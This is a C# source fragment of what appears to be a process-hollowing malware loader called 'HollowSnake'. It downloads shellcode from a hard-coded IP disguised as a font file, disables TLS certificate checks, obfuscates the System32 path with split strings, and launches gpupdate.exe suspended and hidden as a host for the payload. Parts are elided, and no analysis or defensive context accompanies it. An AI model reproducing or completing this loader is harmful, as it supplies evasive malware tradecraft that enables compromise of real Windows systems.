...
namespace HollowSnake_exe
{
    class Program
    {

        private static string url = "http://10.181.96.101/css/fonts/fontawesome.woff";
        private static string syspath = "C:\\" + "Wi" + "ndo" + "ws" + "\\" + "S" + "ys" + "tem" + "32" + "\\";
        private static string bin = "gpupdate.exe";
        ...
        public static void de()
        {
            ...
            ServicePointManager.ServerCertificateValidationCallback += (sender, crt, chain, sslPolicyErrors) => true;
            WebClient carrot = new WebClient();
            byte[] sc = carrot.DownloadData(url);
            ...
            string binaryPath = syspath + bin;
            IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED | CreateProcessFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, sInfo, out pInfo);
